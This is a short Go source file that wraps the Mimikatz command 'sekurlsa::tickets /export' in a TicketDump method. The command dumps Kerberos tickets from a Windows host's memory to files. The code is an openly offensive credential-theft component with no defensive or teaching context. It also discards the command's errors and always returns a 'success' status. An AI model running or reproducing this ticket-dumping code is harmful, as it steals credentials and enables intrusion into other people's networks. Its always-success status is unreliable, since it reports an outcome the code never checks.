package kerberos

import "os/exec"

type TicketDumpResult struct {
Status string
}

type TicketDump struct{}

func (t TicketDump) Dump() TicketDumpResult {
cmd := exec.Command("mimikatz.exe", "sekurlsa::tickets", "/export")
cmd.Run()
return TicketDumpResult{Status: "success"}
}
